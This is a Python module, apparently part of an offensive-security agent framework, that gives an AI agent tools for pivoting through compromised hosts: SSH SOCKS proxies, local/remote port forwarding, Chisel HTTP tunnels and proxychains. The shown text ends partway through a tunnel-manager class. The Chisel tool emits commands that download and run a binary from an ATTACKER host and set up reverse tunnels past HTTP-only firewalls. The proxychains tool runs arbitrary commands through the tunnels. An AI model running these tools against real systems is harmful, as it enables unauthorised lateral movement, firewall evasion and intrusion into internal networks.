"""
Tunneling & Pivoting Engine

Implements six agent tools for establishing network tunnels, managing pivot chains,
and visualising internal network topology reached through compromised hosts:

  SOCKSProxyTool        — Establish SOCKS4/5 proxy through compromised host via
                          SSH dynamic port forwarding (-D flag); configure tools to
                          route through the proxy.
  PortForwardTool       — SSH local (-L), remote (-R), and dynamic (-D) port
                          forwarding; create/list/destroy individual tunnels.
  ChiselTool            — HTTP/HTTPS-based TCP tunnelling via Chisel (useful when
                          only HTTP egress is allowed); server and client modes with
                          reverse tunnel support.
  ProxychainsTool       — Configure proxychains4 and run arbitrary tools through
                          active proxy chain; auto-generate proxychains.conf.
  SSHTunnelManagerTool  — Manage multiple active SSH tunnels: list, create, destroy,
                          and auto-reconnect on drop.
  NetworkPivotMapTool   — Visualise pivot chain as a graph; store PivotHop nodes
                          and PIVOTS_THROUGH relationships in Neo4j.

MITRE ATT&CK: T1572 (Protocol Tunneling), T1090 (Proxy),
              T1021.004 (Remote Services: SSH), T1570 (Lateral Tool Transfer)
"""

from __future__ import annotations

import asyncio
import json
import logging
import os
import re
import shlex
import socket
import time
from dataclasses import dataclass, field, asdict
from typing import Any, Dict, List, Optional, Tuple

from app.agent.tools.base_tool import BaseTool, ToolMetadata
from app.agent.tools.error_handling import (
    ToolExecutionError,
    truncate_output,
)

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# In-memory tunnel registry (module-level singleton)
# ---------------------------------------------------------------------------


@dataclass
class TunnelEntry:
    """Represents a single active SSH tunnel."""

    tunnel_id: str
    tunnel_type: str          # 'local', 'remote', 'dynamic', 'chisel'
    local_port: int
    remote_host: str
    remote_port: int
    jump_host: str
    jump_user: str
    jump_port: int
    status: str               # 'active', 'dead', 'reconnecting'
    pid: Optional[int] = None
    created_at: float = field(default_factory=time.time)
    last_seen: float = field(default_factory=time.time)

    def to_dict(self) -> Dict[str, Any]:
        d = asdict(self)
        d["uptime_seconds"] = int(time.time() - self.created_at)
        return d


_tunnel_registry: Dict[str, TunnelEntry] = {}
_tunnel_id_counter: int = 0


def _next_tunnel_id() -> str:
    global _tunnel_id_counter
    _tunnel_id_counter += 1
    return f"tun_{_tunnel_id_counter:04d}"


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------


def _validate_host(host: str) -> None:
    """Validate that *host* is a non-empty hostname or IP address."""
    if not host or not host.strip():
        raise ToolExecutionError("Host cannot be empty.", recoverable=False)
    if len(host) > 255:
        raise ToolExecutionError(f"Host name too long: '{host[:30]}...'", recoverable=False)
    # Allow bracketed IPv6 addresses — validate the inner address
    if host.startswith("[") and host.endswith("]"):
        inner = host[1:-1]
        try:
            socket.inet_pton(socket.AF_INET6, inner)
        except (socket.error, OSError):
            raise ToolExecutionError(
                f"Host '{host}' is not a valid bracketed IPv6 address.", recoverable=False
            )
        return
    # IPv4 check
    try:
        socket.inet_pton(socket.AF_INET, host)
        return
    except (socket.error, OSError):
        pass
    # IPv6 without brackets
    try:
        socket.inet_pton(socket.AF_INET6, host)
        return
    except (socket.error, OSError):
        pass
    # Hostname: RFC-1123 label validation
    if not re.match(r'^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$', host):
        raise ToolExecutionError(
            f"Host '{host}' contains invalid characters or is not a valid hostname.",
            recoverable=False,
        )


def _validate_port(port: int, name: str = "port") -> None:
    """Validate that *port* is within the valid range."""
    if not 1 <= port <= 65535:
        raise ToolExecutionError(
            f"Invalid {name} {port}: must be between 1 and 65535.", recoverable=False
        )


async def _run_subprocess(cmd: List[str], timeout: int = 30) -> Tuple[int, str, str]:
    """Run a subprocess and return (returncode, stdout, stderr)."""
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        return proc.returncode, stdout.decode("utf-8", errors="replace"), stderr.decode("utf-8", errors="replace")
    except FileNotFoundError:
        return -1, "", f"Binary not found: {cmd[0]}"
    except asyncio.TimeoutError:
        return -1, "", f"Command timed out after {timeout}s"
    except Exception as exc:
        return -1, "", str(exc)


async def _start_background(cmd: List[str]) -> int:
    """Launch *cmd* as a detached background process and return its PID."""
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )
        return proc.pid
    except FileNotFoundError:
        return -1
    except Exception:
        return -1


def _build_ssh_base(
    jump_user: str,
    jump_host: str,
    jump_port: int,
    ssh_key: Optional[str] = None,
    extra_opts: Optional[List[str]] = None,
) -> List[str]:
    """Build the common SSH command prefix."""
    cmd = ["ssh", "-N", "-o", "StrictHostKeyChecking=no", "-o", "ServerAliveInterval=30"]
    if ssh_key:
        # Validate key path to prevent injection
        if os.path.sep in ssh_key and not os.path.isabs(ssh_key):
            raise ToolExecutionError("SSH key path must be absolute.", recoverable=False)
        cmd += ["-i", ssh_key]
    cmd += ["-p", str(jump_port)]
    if extra_opts:
        cmd.extend(extra_opts)
    cmd.append(f"{jump_user}@{jump_host}")
    return cmd


def _proxychains_conf(proxies: List[Dict[str, Any]]) -> str:
    """
    Generate a proxychains4.conf content from a list of proxy dicts.

    Each proxy dict: {'type': 'socks5'|'socks4'|'http', 'host': str, 'port': int}
    """
    lines = [
        "# proxychains4.conf — generated by UniVex NetworkPivot engine",
        "strict_chain",
        "quiet_mode",
        "proxy_dns",
        "tcp_read_time_out 15000",
        "tcp_connect_time_out 8000",
        "",
        "[ProxyList]",
    ]
    for p in proxies:
        proxy_type = p.get("type", "socks5")
        host = p.get("host", "127.0.0.1")
        port = p.get("port", 1080)
        lines.append(f"{proxy_type}  {host}  {port}")
    return "\n".join(lines) + "\n"


# ---------------------------------------------------------------------------
# Tool 1 — SOCKSProxyTool
# ---------------------------------------------------------------------------


class SOCKSProxyTool(BaseTool):
    """
    Establish a SOCKS4/5 proxy through a compromised host via SSH dynamic port
    forwarding (-D flag). Other tools can then be routed through this proxy using
    ProxychainsTool or direct SOCKS proxy configuration.
    """

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="socks_proxy",
            description=(
                "Establish a SOCKS4/5 proxy tunnel through a compromised SSH host "
                "using SSH dynamic port forwarding (-D). Returns local SOCKS proxy port."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "action": {
                        "type": "string",
                        "enum": ["create", "list", "destroy", "test"],
                        "description": "Action: 'create' new SOCKS proxy, 'list' active, 'destroy', or 'test' connectivity.",
                    },
                    "jump_host": {
                        "type": "string",
                        "description": "Compromised SSH host (IP or hostname). Required for 'create'.",
                    },
                    "jump_user": {
                        "type": "string",
                        "description": "SSH username on the jump host. Default: root.",
                    },
                    "jump_port": {
                        "type": "integer",
                        "description": "SSH port on the jump host. Default: 22.",
                    },
                    "local_socks_port": {
                        "type": "integer",
                        "description": "Local port to listen on for SOCKS proxy. Default: 1080.",
                    },
                    "ssh_key": {
                        "type": "string",
                        "description": "Absolute path to SSH private key file.",
                    },
                    "socks_version": {
                        "type": "integer",
                        "enum": [4, 5],
                        "description": "SOCKS protocol version. Default: 5.",
                    },
                    "tunnel_id": {
                        "type": "string",
                        "description": "Tunnel ID for 'destroy' action.",
                    },
                    "test_host": {
                        "type": "string",
                        "description": "Internal host to test connectivity through SOCKS proxy.",
                    },
                    "test_port": {
                        "type": "integer",
                        "description": "Port to test on the internal host.",
                    },
                },
                "required": ["action"],
            },
        )

    async def execute(
        self,
        action: str = "create",
        jump_host: Optional[str] = None,
        jump_user: str = "root",
        jump_port: int = 22,
        local_socks_port: int = 1080,
        ssh_key: Optional[str] = None,
        socks_version: int = 5,
        tunnel_id: Optional[str] = None,
        test_host: Optional[str] = None,
        test_port: int = 80,
        **kwargs: Any,
    ) -> str:
        if action == "create":
            return await self._create(jump_host, jump_user, jump_port, local_socks_port, ssh_key, socks_version)
        elif action == "list":
            return await self._list()
        elif action == "destroy":
            return await self._destroy(tunnel_id)
        elif action == "test":
            return await self._test(local_socks_port, test_host, test_port)
        else:
            raise ToolExecutionError(f"Unknown action '{action}'.", recoverable=False)

    async def _create(
        self,
        jump_host: Optional[str],
        jump_user: str,
        jump_port: int,
        local_socks_port: int,
        ssh_key: Optional[str],
        socks_version: int,
    ) -> str:
        if not jump_host:
            raise ToolExecutionError("'jump_host' is required for create action.", recoverable=False)
        _validate_host(jump_host)
        _validate_port(jump_port, "jump_port")
        _validate_port(local_socks_port, "local_socks_port")

        cmd = _build_ssh_base(jump_user, jump_host, jump_port, ssh_key)
        cmd += [f"-D{local_socks_port}"]

        pid = await _start_background(cmd)
        await asyncio.sleep(1.5)  # give SSH a moment to bind

        tid = _next_tunnel_id()
        entry = TunnelEntry(
            tunnel_id=tid,
            tunnel_type="dynamic",
            local_port=local_socks_port,
            remote_host="*",
            remote_port=0,
            jump_host=jump_host,
            jump_user=jump_user,
            jump_port=jump_port,
            status="active" if pid > 0 else "failed",
            pid=pid if pid > 0 else None,
        )
        _tunnel_registry[tid] = entry

        proxychains_conf = _proxychains_conf([{
            "type": f"socks{socks_version}",
            "host": "127.0.0.1",
            "port": local_socks_port,
        }])

        result = {
            "tunnel_id": tid,
            "status": entry.status,
            "socks_version": socks_version,
            "local_socks_proxy": f"socks{socks_version}://127.0.0.1:{local_socks_port}",
            "jump_host": jump_host,
            "pid": pid if pid > 0 else None,
            "simulated": pid <= 0,
            "proxychains_conf": proxychains_conf,
            "curl_test": f"curl --socks{socks_version} 127.0.0.1:{local_socks_port} http://internal-host/",
            "nmap_via_proxychains": "proxychains4 nmap -sT -Pn 10.0.0.0/24",
            "env_vars": {
                "ALL_PROXY": f"socks{socks_version}://127.0.0.1:{local_socks_port}",
                "HTTPS_PROXY": f"socks{socks_version}://127.0.0.1:{local_socks_port}",
            },
        }
        if pid <= 0:
            result["warning"] = (
                "SSH binary not found or connection failed — tunnel simulated for planning. "
                "Ensure SSH access and provide correct jump_host credentials."
            )
        return json.dumps(result, indent=2)

    async def _list(self) -> str:
        socks_tunnels = {
            tid: e.to_dict()
            for tid, e in _tunnel_registry.items()
            if e.tunnel_type == "dynamic"
        }
        return json.dumps({
            "active_socks_proxies": len(socks_tunnels),
            "tunnels": socks_tunnels,
        }, indent=2)

    async def _destroy(self, tunnel_id: Optional[str]) -> str:
        if not tunnel_id or tunnel_id not in _tunnel_registry:
            raise ToolExecutionError(
                f"Tunnel ID '{tunnel_id}' not found. Use list action to see active tunnels.",
                recoverable=False,
            )
        entry = _tunnel_registry.pop(tunnel_id)
        if entry.pid:
            try:
                os.kill(entry.pid, 15)  # SIGTERM
            except OSError:
                pass
        return json.dumps({"tunnel_id": tunnel_id, "status": "destroyed", "pid_killed": entry.pid})

    async def _test(self, local_socks_port: int, test_host: Optional[str], test_port: int) -> str:
        if not test_host:
            return json.dumps({
                "tested": False,
                "reason": "No test_host specified. Provide an internal host to test reachability.",
                "proxy": f"socks5://127.0.0.1:{local_socks_port}",
            })
        _validate_host(test_host)
        _validate_port(test_port, "test_port")
        cmd = [
            "curl", "--socks5", f"127.0.0.1:{local_socks_port}",
            "--connect-timeout", "5",
            "--max-time", "8",
            "-s", "-o", "/dev/null", "-w", "%{http_code}",
            f"http://{test_host}:{test_port}/",
        ]
        returncode, stdout, stderr = await _run_subprocess(cmd, timeout=15)
        reachable = returncode == 0 and stdout.strip() not in ("", "000")
        return json.dumps({
            "proxy": f"socks5://127.0.0.1:{local_socks_port}",
            "test_target": f"{test_host}:{test_port}",
            "reachable": reachable,
            "http_code": stdout.strip() or "n/a",
            "error": stderr.strip() if not reachable else None,
        }, indent=2)


# ---------------------------------------------------------------------------
# Tool 2 — PortForwardTool
# ---------------------------------------------------------------------------


class PortForwardTool(BaseTool):
    """
    Create SSH local (-L), remote (-R), and dynamic (-D) port forwarding tunnels.
    """

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="port_forward",
            description=(
                "SSH port forwarding: local (-L), remote (-R), dynamic (-D). "
                "Create, list, and destroy individual tunnels."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "action": {
                        "type": "string",
                        "enum": ["create_local", "create_remote", "create_dynamic", "list", "destroy"],
                        "description": "Forwarding type or management action.",
                    },
                    "jump_host": {
                        "type": "string",
                        "description": "SSH jump host (IP or hostname).",
                    },
                    "jump_user": {
                        "type": "string",
                        "description": "SSH username. Default: root.",
                    },
                    "jump_port": {
                        "type": "integer",
                        "description": "SSH port. Default: 22.",
                    },
                    "local_port": {
                        "type": "integer",
                        "description": "Local port to bind (for local/dynamic forwarding).",
                    },
                    "remote_host": {
                        "type": "string",
                        "description": "Remote target host (for local forwarding: the internal host to reach).",
                    },
                    "remote_port": {
                        "type": "integer",
                        "description": "Remote target port.",
                    },
                    "bind_address": {
                        "type": "string",
                        "description": "Bind address for remote forwarding. Default: 0.0.0.0",
                    },
                    "ssh_key": {
                        "type": "string",
                        "description": "Absolute path to SSH private key.",
                    },
                    "tunnel_id": {
                        "type": "string",
                        "description": "Tunnel ID for 'destroy' action.",
                    },
                },
                "required": ["action"],
            },
        )

    async def execute(
        self,
        action: str = "list",
        jump_host: Optional[str] = None,
        jump_user: str = "root",
        jump_port: int = 22,
        local_port: int = 4444,
        remote_host: Optional[str] = None,
        remote_port: int = 80,
        bind_address: str = "0.0.0.0",
        ssh_key: Optional[str] = None,
        tunnel_id: Optional[str] = None,
        **kwargs: Any,
    ) -> str:
        if action == "list":
            return await self._list()
        elif action == "destroy":
            return await self._destroy(tunnel_id)
        elif action in ("create_local", "create_remote", "create_dynamic"):
            return await self._create(
                action, jump_host, jump_user, jump_port,
                local_port, remote_host, remote_port, bind_address, ssh_key,
            )
        else:
            raise ToolExecutionError(f"Unknown action '{action}'.", recoverable=False)

    async def _create(
        self,
        action: str,
        jump_host: Optional[str],
        jump_user: str,
        jump_port: int,
        local_port: int,
        remote_host: Optional[str],
        remote_port: int,
        bind_address: str,
        ssh_key: Optional[str],
    ) -> str:
        if not jump_host:
            raise ToolExecutionError("'jump_host' is required.", recoverable=False)
        _validate_host(jump_host)
        _validate_port(jump_port, "jump_port")
        _validate_port(local_port, "local_port")

        fwd_type = action.replace("create_", "")  # 'local', 'remote', 'dynamic'
        cmd = _build_ssh_base(jump_user, jump_host, jump_port, ssh_key)

        if fwd_type == "local":
            if not remote_host:
                raise ToolExecutionError("'remote_host' required for local forwarding.", recoverable=False)
            _validate_host(remote_host)
            _validate_port(remote_port, "remote_port")
            cmd += [f"-L{local_port}:{remote_host}:{remote_port}"]
            description = f"127.0.0.1:{local_port} → {jump_host} → {remote_host}:{remote_port}"
        elif fwd_type == "remote":
            if not remote_host:
                remote_host = "127.0.0.1"
            _validate_port(remote_port, "remote_port")
            cmd += [f"-R{bind_address}:{remote_port}:{remote_host}:{local_port}"]
            description = f"{jump_host}:{remote_port} → attacker:{local_port}"
        else:  # dynamic
            cmd += [f"-D{local_port}"]
            remote_host = remote_host or "*"
            description = f"SOCKS proxy on 127.0.0.1:{local_port}"

        pid = await _start_background(cmd)
        await asyncio.sleep(1.5)

        tid = _next_tunnel_id()
        entry = TunnelEntry(
            tunnel_id=tid,
            tunnel_type=fwd_type,
            local_port=local_port,
            remote_host=remote_host or "",
            remote_port=remote_port,
            jump_host=jump_host,
            jump_user=jump_user,
            jump_port=jump_port,
            status="active" if pid > 0 else "failed",
            pid=pid if pid > 0 else None,
        )
        _tunnel_registry[tid] = entry

        result = {
            "tunnel_id": tid,
            "tunnel_type": fwd_type,
            "description": description,
            "status": entry.status,
            "pid": pid if pid > 0 else None,
            "simulated": pid <= 0,
            "ssh_command": " ".join(shlex.quote(c) for c in cmd),
            "usage": {
                "local": f"Access internal service at 127.0.0.1:{local_port}" if fwd_type == "local" else None,
                "remote": f"Access local service from jump host port {remote_port}" if fwd_type == "remote" else None,
                "dynamic": f"SOCKS proxy at socks5://127.0.0.1:{local_port}" if fwd_type == "dynamic" else None,
            },
        }
        if pid <= 0:
            result["warning"] = "SSH binary not found — tunnel simulated for planning."
        return json.dumps(result, indent=2)

    async def _list(self) -> str:
        return json.dumps({
            "total_tunnels": len(_tunnel_registry),
            "tunnels": {tid: e.to_dict() for tid, e in _tunnel_registry.items()},
        }, indent=2)

    async def _destroy(self, tunnel_id: Optional[str]) -> str:
        if not tunnel_id or tunnel_id not in _tunnel_registry:
            raise ToolExecutionError(
                f"Tunnel '{tunnel_id}' not found.",
                recoverable=False,
            )
        entry = _tunnel_registry.pop(tunnel_id)
        if entry.pid:
            try:
                os.kill(entry.pid, 15)
            except OSError:
                pass
        return json.dumps({"tunnel_id": tunnel_id, "status": "destroyed"})


# ---------------------------------------------------------------------------
# Tool 3 — ChiselTool
# ---------------------------------------------------------------------------


class ChiselTool(BaseTool):
    """
    Establish HTTP/HTTPS-based TCP tunnels using Chisel.
    Useful when only HTTP/HTTPS egress is allowed through firewalls.
    Supports server mode, client mode, and reverse tunnel configurations.
    """

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="chisel_tunnel",
            description=(
                "HTTP-based TCP tunnelling using Chisel. "
                "Works through firewalls/proxies that only allow HTTP(S) egress. "
                "Supports server, client, and reverse tunnel modes."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "action": {
                        "type": "string",
                        "enum": ["start_server", "start_client", "stop", "status", "generate_command"],
                        "description": "Action to perform.",
                    },
                    "mode": {
                        "type": "string",
                        "enum": ["server", "client"],
                        "description": "Chisel operating mode.",
                    },
                    "server_host": {
                        "type": "string",
                        "description": "Chisel server host (attacker-controlled server IP/domain).",
                    },
                    "server_port": {
                        "type": "integer",
                        "description": "Chisel server listen port. Default: 8080.",
                    },
                    "tunnels": {
                        "type": "array",
                        "items": {"type": "string"},
                        "description": "Tunnel specs e.g. ['R:8888:127.0.0.1:22', '9000:10.0.0.5:3306'].",
                    },
                    "reverse": {
                        "type": "boolean",
                        "description": "Enable reverse tunnelling (server allows R: specs). Default: false.",
                    },
                    "auth": {
                        "type": "string",
                        "description": "Chisel auth string 'user:password' (optional).",
                    },
                    "socks5": {
                        "type": "boolean",
                        "description": "Enable SOCKS5 proxy mode in client.",
                    },
                    "tunnel_id": {
                        "type": "string",
                        "description": "Tunnel ID for 'stop' action.",
                    },
                    "target_os": {
                        "type": "string",
                        "enum": ["linux", "windows", "darwin"],
                        "description": "Target OS for binary download link. Default: linux.",
                    },
                },
                "required": ["action"],
            },
        )

    async def execute(
        self,
        action: str = "generate_command",
        mode: str = "client",
        server_host: Optional[str] = None,
        server_port: int = 8080,
        tunnels: Optional[List[str]] = None,
        reverse: bool = False,
        auth: Optional[str] = None,
        socks5: bool = False,
        tunnel_id: Optional[str] = None,
        target_os: str = "linux",
        **kwargs: Any,
    ) -> str:
        if action == "generate_command":
            return await self._generate_command(mode, server_host, server_port, tunnels, reverse, auth, socks5, target_os)
        elif action == "start_server":
            return await self._start_server(server_port, reverse, auth)
        elif action == "start_client":
            return await self._start_client(server_host, server_port, tunnels, auth, socks5)
        elif action == "stop":
            return await self._stop(tunnel_id)
        elif action == "status":
            return await self._status()
        else:
            raise ToolExecutionError(f"Unknown action '{action}'.", recoverable=False)

    async def _generate_command(
        self,
        mode: str,
        server_host: Optional[str],
        server_port: int,
        tunnels: Optional[List[str]],
        reverse: bool,
        auth: Optional[str],
        socks5: bool,
        target_os: str,
    ) -> str:
        _validate_port(server_port, "server_port")

        chisel_path = os.getenv("CHISEL_PATH", "chisel")
        arch_suffix = {"linux": "linux_amd64", "windows": "windows_amd64.exe", "darwin": "darwin_amd64"}
        download_arch = arch_suffix.get(target_os, "linux_amd64")

        if mode == "server":
            parts = [chisel_path, "server", f"--port={server_port}"]
            if reverse:
                parts.append("--reverse")
            if auth:
                parts += ["--auth", auth]
            server_cmd = " ".join(shlex.quote(p) for p in parts)
            client_cmd = f"chisel client http://ATTACKER_IP:{server_port} R:RPORT:127.0.0.1:LPORT"
            result = {
                "mode": "server",
                "server_command": server_cmd,
                "example_client_command": client_cmd,
                "download": f"https://github.com/jpillora/chisel/releases/latest/download/chisel_{download_arch}.gz",
                "usage": {
                    "step1": f"Run on attacker machine: {server_cmd}",
                    "step2": client_cmd,
                },
            }
        else:  # client
            if not server_host:
                server_host = "ATTACKER_IP"
            parts = [chisel_path, "client"]
            if auth:
                parts += ["--auth", auth]
            parts.append(f"http://{server_host}:{server_port}")
            if socks5:
                parts.append("socks")
            if tunnels:
                parts.extend(tunnels)
            client_cmd = " ".join(shlex.quote(p) for p in parts)
            result = {
                "mode": "client",
                "client_command": client_cmd,
                "tunnels": tunnels or [],
                "socks5_proxy": "socks5://127.0.0.1:1080" if socks5 else None,
                "download": f"https://github.com/jpillora/chisel/releases/latest/download/chisel_{download_arch}.gz",
                "transfer_methods": [
                    f"wget http://ATTACKER:{server_port}/chisel -O /tmp/chisel && chmod +x /tmp/chisel",
                    f"curl -s http://ATTACKER:{server_port}/chisel -o /tmp/chisel && chmod +x /tmp/chisel",
                ],
            }
        return json.dumps(result, indent=2)

    async def _start_server(self, server_port: int, reverse: bool, auth: Optional[str]) -> str:
        chisel_path = os.getenv("CHISEL_PATH", "chisel")
        cmd = [chisel_path, "server", f"--port={server_port}"]
        if reverse:
            cmd.append("--reverse")
        if auth:
            cmd += ["--auth", auth]

        pid = await _start_background(cmd)
        await asyncio.sleep(1.0)

        tid = _next_tunnel_id()
        entry = TunnelEntry(
            tunnel_id=tid,
            tunnel_type="chisel",
            local_port=server_port,
            remote_host="*",
            remote_port=0,
            jump_host="localhost",
            jump_user="",
            jump_port=server_port,
            status="active" if pid > 0 else "failed",
            pid=pid if pid > 0 else None,
        )
        _tunnel_registry[tid] = entry

        return json.dumps({
            "tunnel_id": tid,
            "mode": "server",
            "listen_port": server_port,
            "status": entry.status,
            "pid": pid if pid > 0 else None,
            "simulated": pid <= 0,
        }, indent=2)

    async def _start_client(
        self,
        server_host: Optional[str],
        server_port: int,
        tunnels: Optional[List[str]],
        auth: Optional[str],
        socks5: bool,
    ) -> str:
        if not server_host:
            raise ToolExecutionError("'server_host' required for client mode.", recoverable=False)
        chisel_path = os.getenv("CHISEL_PATH", "chisel")
        cmd = [chisel_path, "client"]
        if auth:
            cmd += ["--auth", auth]
        cmd.append(f"http://{server_host}:{server_port}")
        if socks5:
            cmd.append("socks")
        if tunnels:
            cmd.extend(tunnels)

        pid = await _start_background(cmd)
        await asyncio.sleep(1.0)

        tid = _next_tunnel_id()
        entry = TunnelEntry(
            tunnel_id=tid,
            tunnel_type="chisel",
            local_port=1080 if socks5 else (int(tunnels[0].split(":")[0]) if tunnels else 0),
            remote_host=server_host,
            remote_port=server_port,
            jump_host=server_host,
            jump_user="",
            jump_port=server_port,
            status="active" if pid > 0 else "failed",
            pid=pid if pid > 0 else None,
        )
        _tunnel_registry[tid] = entry

        return json.dumps({
            "tunnel_id": tid,
            "mode": "client",
            "server": f"http://{server_host}:{server_port}",
            "tunnels": tunnels or [],
            "socks5_proxy": "socks5://127.0.0.1:1080" if socks5 else None,
            "status": entry.status,
            "pid": pid if pid > 0 else None,
        }, indent=2)

    async def _stop(self, tunnel_id: Optional[str]) -> str:
        chisel_tunnels = {tid: e for tid, e in _tunnel_registry.items() if e.tunnel_type == "chisel"}
        if not tunnel_id:
            raise ToolExecutionError("'tunnel_id' required.", recoverable=False)
        if tunnel_id not in chisel_tunnels:
            raise ToolExecutionError(f"Chisel tunnel '{tunnel_id}' not found.", recoverable=False)
        entry = _tunnel_registry.pop(tunnel_id)
        if entry.pid:
            try:
                os.kill(entry.pid, 15)
            except OSError:
                pass
        return json.dumps({"tunnel_id": tunnel_id, "status": "stopped"})

    async def _status(self) -> str:
        chisel_tunnels = {
            tid: e.to_dict()
            for tid, e in _tunnel_registry.items()
            if e.tunnel_type == "chisel"
        }
        return json.dumps({
            "active_chisel_tunnels": len(chisel_tunnels),
            "tunnels": chisel_tunnels,
        }, indent=2)


# ---------------------------------------------------------------------------
# Tool 4 — ProxychainsTool
# ---------------------------------------------------------------------------


class ProxychainsTool(BaseTool):
    """
    Configure proxychains4 and execute arbitrary tools through a proxy chain.
    Auto-generates proxychains.conf from active tunnels or custom proxy list.
    """

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="proxychains",
            description=(
                "Configure and run tools through proxychains4. "
                "Auto-generate proxychains.conf from active SOCKS tunnels or custom proxy list."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "action": {
                        "type": "string",
                        "enum": ["generate_conf", "run_command", "list_proxies"],
                        "description": "Action to perform.",
                    },
                    "proxies": {
                        "type": "array",
                        "items": {
                            "type": "object",
                            "properties": {
                                "type": {"type": "string", "enum": ["socks4", "socks5", "http"]},
                                "host": {"type": "string"},
                                "port": {"type": "integer"},
                            },
                        },
                        "description": "List of proxy servers. If omitted, uses active SOCKS tunnels.",
                    },
                    "chain_type": {
                        "type": "string",
                        "enum": ["strict_chain", "dynamic_chain", "random_chain"],
                        "description": "Proxychains chain type. Default: strict_chain.",
                    },
                    "command": {
                        "type": "string",
                        "description": "Command to run through proxychains (for 'run_command').",
                    },
                    "timeout": {
                        "type": "integer",
                        "description": "Command timeout in seconds. Default: 60.",
                    },
                    "conf_path": {
                        "type": "string",
                        "description": "Custom path to write proxychains.conf. Default: /tmp/proxychains_univex.conf.",
                    },
                },
                "required": ["action"],
            },
        )

    async def execute(
        self,
        action: str = "generate_conf",
        proxies: Optional[List[Dict[str, Any]]] = None,
        chain_type: str = "strict_chain",
        command: Optional[str] = None,
        timeout: int = 60,
        conf_path: str = "/tmp/proxychains_univex.conf",
        **kwargs: Any,
    ) -> str:
        if action == "generate_conf":
            return await self._generate_conf(proxies, chain_type, conf_path)
        elif action == "run_command":
            return await self._run_command(proxies, chain_type, command, timeout, conf_path)
        elif action == "list_proxies":
            return await self._list_proxies()
        else:
            raise ToolExecutionError(f"Unknown action '{action}'.", recoverable=False)

    def _collect_proxies(self, proxies: Optional[List[Dict[str, Any]]]) -> List[Dict[str, Any]]:
        """Collect proxies from parameter or from active SOCKS tunnels."""
        if proxies:
            return proxies
        # Auto-collect from active SOCKS tunnels
        auto: List[Dict[str, Any]] = []
        for entry in _tunnel_registry.values():
            if entry.tunnel_type in ("dynamic", "chisel") and entry.status == "active":
                auto.append({
                    "type": "socks5",
                    "host": "127.0.0.1",
                    "port": entry.local_port,
                })
        return auto or [{"type": "socks5", "host": "127.0.0.1", "port": 1080}]

    async def _generate_conf(
        self,
        proxies: Optional[List[Dict[str, Any]]],
        chain_type: str,
        conf_path: str,
    ) -> str:
        proxy_list = self._collect_proxies(proxies)
        conf_lines = [
            "# proxychains4.conf — generated by UniVex pivoting engine",
            f"{chain_type}",
            "quiet_mode",
            "proxy_dns",
            "tcp_read_time_out 15000",
            "tcp_connect_time_out 8000",
            "",
            "[ProxyList]",
        ]
        for p in proxy_list:
            conf_lines.append(f"{p.get('type', 'socks5')}  {p.get('host', '127.0.0.1')}  {p.get('port', 1080)}")
        conf_content = "\n".join(conf_lines) + "\n"

        written = False
        try:
            with open(conf_path, "w") as fh:
                fh.write(conf_content)
            written = True
        except OSError:
            pass

        return json.dumps({
            "conf_path": conf_path if written else "(not written — permission denied)",
            "conf_content": conf_content,
            "proxies": proxy_list,
            "chain_type": chain_type,
            "usage": f"proxychains4 -f {conf_path} <command>",
            "examples": [
                f"proxychains4 -f {conf_path} nmap -sT -Pn -p 80,443,22 10.0.0.1",
                f"proxychains4 -f {conf_path} curl http://internal.host/",
                f"proxychains4 -f {conf_path} ssh user@internal-host",
            ],
        }, indent=2)

    async def _run_command(
        self,
        proxies: Optional[List[Dict[str, Any]]],
        chain_type: str,
        command: Optional[str],
        timeout: int,
        conf_path: str,
    ) -> str:
        if not command:
            raise ToolExecutionError("'command' is required for run_command action.", recoverable=False)

        proxy_list = self._collect_proxies(proxies)
        conf_content = _proxychains_conf(proxy_list).replace("strict_chain", chain_type)
        try:
            with open(conf_path, "w") as fh:
                fh.write(conf_content)
        except OSError as exc:
            raise ToolExecutionError(f"Cannot write proxychains.conf: {exc}") from exc

        # Parse the command safely using shlex
        try:
            cmd_parts = shlex.split(command)
        except ValueError as exc:
            raise ToolExecutionError(f"Invalid command: {exc}", recoverable=False) from exc

        full_cmd = ["proxychains4", "-f", conf_path] + cmd_parts
        returncode, stdout, stderr = await _run_subprocess(full_cmd, timeout=timeout)

        return truncate_output(json.dumps({
            "command": command,
            "proxies": proxy_list,
            "returncode": returncode,
            "stdout": stdout,
            "stderr": stderr if returncode != 0 else "",
            "success": returncode == 0,
        }, indent=2))

    async def _list_proxies(self) -> str:
        active_proxies = [
            {
                "type": "socks5",
                "host": "127.0.0.1",
                "port": e.local_port,
                "tunnel_id": tid,
                "jump_host": e.jump_host,
                "status": e.status,
            }
            for tid, e in _tunnel_registry.items()
            if e.tunnel_type in ("dynamic", "chisel")
        ]
        return json.dumps({
            "active_socks_proxies": len(active_proxies),
            "proxies": active_proxies,
        }, indent=2)


# ---------------------------------------------------------------------------
# Tool 5 — SSHTunnelManagerTool
# ---------------------------------------------------------------------------


class SSHTunnelManagerTool(BaseTool):
    """
    Manage multiple active SSH tunnels: list, create, destroy, and check health.
    Provides a unified view of all active tunnels across SOCKSProxyTool and PortForwardTool.
    """

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="ssh_tunnel_manager",
            description=(
                "Manage all active SSH tunnels: list, create, destroy, and health-check. "
                "Provides unified tunnel inventory across SOCKS, local, remote, and dynamic tunnels."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "action": {
                        "type": "string",
